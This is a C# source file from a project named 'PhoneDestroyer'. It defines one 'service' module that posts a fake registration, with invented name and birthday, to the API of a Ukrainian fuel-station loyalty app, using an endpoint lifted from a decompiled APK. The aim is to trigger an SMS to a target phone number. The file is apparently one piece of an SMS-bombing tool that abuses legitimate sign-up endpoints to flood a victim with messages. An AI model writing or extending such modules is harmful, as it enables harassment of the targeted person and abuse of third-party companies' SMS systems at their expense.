using PhoneDestroyer.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace PhoneDestroyer.Services
{
    public class BRSM : Service
    {
        public override string Name => "BRSM Plus";
        public override CountryCodes AvailableFor => CountryCodes.UA;

        public override async Task<bool> SendSmsAsync()
        {
            // data from decompiled apk
            // TODO: Check if user already registerd, and if so send "Forgot password" request
            var resp = await Client.PostAsync("https://td4.brsm-nafta.com/api/v2/Mobile/step1",
                new StringContent(JsonSerializer.Serialize(
                    new
                    {
                        last_name = "Василий",
                        first_name = "Василий",
                        sex = "ч",
                        birthday = "01/01/2001",
                        province = "1",
                        city = "1",
                        signed_agreement = true,
                        phone_mobile = $"+{(int)CountryCode}{PhoneNumber}"
                    }), Encoding.UTF8, "application/json"));
            if (LogDebug)
            {
                Logger.LogDebug(await resp.Content.ReadAsStringAsync());
            }
            return resp.IsSuccessStatusCode;
        }
    }
}
